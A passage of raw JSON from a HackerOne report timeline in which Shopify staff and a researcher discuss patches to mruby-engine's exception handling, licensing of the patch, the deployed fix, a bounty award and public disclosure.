bug in mruby, and will let you know once we find out more.\n\nWe'll also get back to you soon regarding a bounty.","markdown_message":"\u003cp\u003eHi again, and thanks for the suggested patches! As a temporary measure we\u0026#39;ve made the change you suggested in the second patch:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/Shopify/mruby-engine/pull/17\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FShopify%2Fmruby-engine%2Fpull%2F17\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Shopify/mruby-engine/pull/17\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eHowever, things don\u0026#39;t quite work correctly if an exception with an overridden \u003ccode\u003eto_s\u003c/code\u003e (that returns a String) is raised. We\u0026#39;re looking into whether this could be due to a bug in mruby, and will let you know once we find out more.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll also get back to you soon regarding a bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-09T22:00:19.264Z","updated_at":"2016-11-09T22:00:19.264Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1292351,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Got it.\nI was also wondering why `to_s` wasn't working (It actually returns the exception). Had some time playing around and the culprit seems to be `self-\u003estate-\u003eexc` being set to the current exception, causing it to be re-raised when we enter the VM again by calling the non-native `to_s`.","markdown_message":"\u003cp\u003eGot it.\u003cbr\u003e\nI was also wondering why \u003ccode\u003eto_s\u003c/code\u003e wasn\u0026#39;t working (It actually returns the exception). Had some time playing around and the culprit seems to be \u003ccode\u003eself-\u0026gt;state-\u0026gt;exc\u003c/code\u003e being set to the current exception, causing it to be re-raised when we enter the VM again by calling the non-native \u003ccode\u003eto_s\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-09T22:39:52.636Z","updated_at":"2016-11-09T22:39:52.636Z","actor":{"username":"isra17","cleared":false,"url":"/isra17","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1293510,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@isra17 since we may end up using the patch you submitted (or parts of it) I just want to confirm in writing that you agree to release it under the original project license (MIT License). We'll attribute the patches to you by linking to this issue and your github account if you wish.","markdown_message":"\u003cp\u003e\u003ca href=\"/isra17\"\u003e@isra17\u003c/a\u003e since we may end up using the patch you submitted (or parts of it) I just want to confirm in writing that you agree to release it under the original project license (MIT License). We\u0026#39;ll attribute the patches to you by linking to this issue and your github account if you wish.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-10T15:50:59.125Z","updated_at":"2016-11-10T15:50:59.125Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1293535,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I agree to release it under the original project license.","markdown_message":"\u003cp\u003eI agree to release it under the original project license.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-10T16:00:42.684Z","updated_at":"2016-11-10T16:00:42.684Z","actor":{"username":"isra17","cleared":false,"url":"/isra17","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1299174,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-11-14T20:46:34.356Z","updated_at":"2016-11-14T20:46:34.356Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1305636,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @isra17,\n\nWe fixed this last week and I forgot to close the issue. The public reference is here: https://github.com/Shopify/mruby-engine/pull/17 and https://github.com/Shopify/mruby-engine/pull/18 and I confirmed the fix is deployed to our production environment.\n\nAs mentioned in your other issues, we'll take a few weeks to make sure our payout amounts are fair across all reports we received and get back to you at that moment!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/isra17\"\u003e@isra17\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe fixed this last week and I forgot to close the issue. The public reference is here: \u003ca title=\"https://github.com/Shopify/mruby-engine/pull/17\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FShopify%2Fmruby-engine%2Fpull%2F17\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Shopify/mruby-engine/pull/17\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca title=\"https://github.com/Shopify/mruby-engine/pull/18\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FShopify%2Fmruby-engine%2Fpull%2F18\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Shopify/mruby-engine/pull/18\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and I confirmed the fix is deployed to our production environment.\u003c/p\u003e\n\n\u003cp\u003eAs mentioned in your other issues, we\u0026#39;ll take a few weeks to make sure our payout amounts are fair across all reports we received and get back to you at that moment!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-17T20:28:37.588Z","updated_at":"2016-11-17T20:28:37.588Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"isra17","url":"/isra17"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1369968,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify Scripts and the mruby project!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify Scripts and the mruby project!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-16T19:35:17.619Z","updated_at":"2016-12-16T19:35:17.619Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"10000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"isra17","url":"/isra17"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1369969,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-16T19:35:25.669Z","updated_at":"2016-12-16T19:35:25.669Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370094,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-16T20:05:23.574Z","updated_at":"2016-12-16T20:05:23.574Z","actor":{"username":"isra17","cleared":false,"url":"/isra17","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1370095,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-16T20:05:23.607Z","updated_at":"2016-12-16T20:05:23.607Z","actor":{"username":"isra17","cleared":false,"url":"/isra17","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}